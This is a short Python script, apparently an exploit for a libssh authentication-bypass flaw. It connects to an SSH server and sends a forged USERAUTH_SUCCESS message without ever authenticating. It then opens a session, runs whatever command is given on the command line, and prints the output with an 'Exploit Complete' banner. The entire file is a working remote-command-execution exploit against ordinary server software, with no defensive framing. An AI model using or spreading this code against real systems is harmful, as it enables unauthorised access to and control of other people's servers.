#!/usr/bin/env python3

import sys
import paramiko
import socket
import logging

# We only want to see critical messages
logging.basicConfig(stream=sys.stdout, level=logging.CRITICAL)
bufsize = 2048

# This is where the magic happens! 
def execute(hostname, port, command):
    sock = socket.socket()
    try:
        sock.connect((hostname, int(port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS) # We send the success message here. This part is important
        transport._send_message(message)

        client = transport.open_session(timeout=10) # Open Session
        client.exec_command(command) # Send command

        stdout = client.makefile("rb", bufsize)
        stderr = client.makefile_stderr("rb", bufsize)

        output = stdout.read()
        error = stderr.read()

        stdout.close()
        stderr.close()

        print ("[+] Command Output (" + command + "): \n")
        return (output+error).decode() + "\n[+] Exploit Complete" # The output is printed here

    except paramiko.SSHException as e: # In case something goes wrong
        logging.exception(e)
        logging.critical("TCP Forwarding disabled on remote server can't connect. Not Vulnerable")
    except socket.error:
        logging.critical("Unable to connect.")

    return None


if __name__ == '__main__':
    print(execute(sys.argv[1], sys.argv[2], sys.argv[3]))
